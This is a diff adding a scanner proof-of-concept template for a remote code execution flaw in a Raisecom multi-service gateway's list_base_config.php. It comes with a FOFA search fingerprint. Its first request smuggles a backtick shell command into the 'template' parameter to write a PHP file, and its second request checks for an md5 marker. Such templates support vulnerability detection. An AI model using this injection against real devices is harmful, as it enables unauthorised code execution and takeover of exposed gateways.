@@ -1,0 +1,19 @@
+id: poc-yaml-raisecom-gateway-list-base-config-php-rce
+info:
+  name: 瑞斯康达-多业务智能网关 list_base_config.php 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: 多业务智能网关
+  fofa: body="/images/raisecom/back.gif"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /vpn/list_base_config.php?type=mod&parts=base_config&template=%60echo+-e+%27%3C%3Fphp+echo+md5%28{{.t1}}%29%3B%3F%3E%27%3E%2Fwww%2Ftmp%2F{{.t1}}.php%60
+  expression: status_code == 200
+- method: GET
+  path: /tmp/{{.t1}}.php
+  expression: status_code == 200 && body == t2
+transport: http
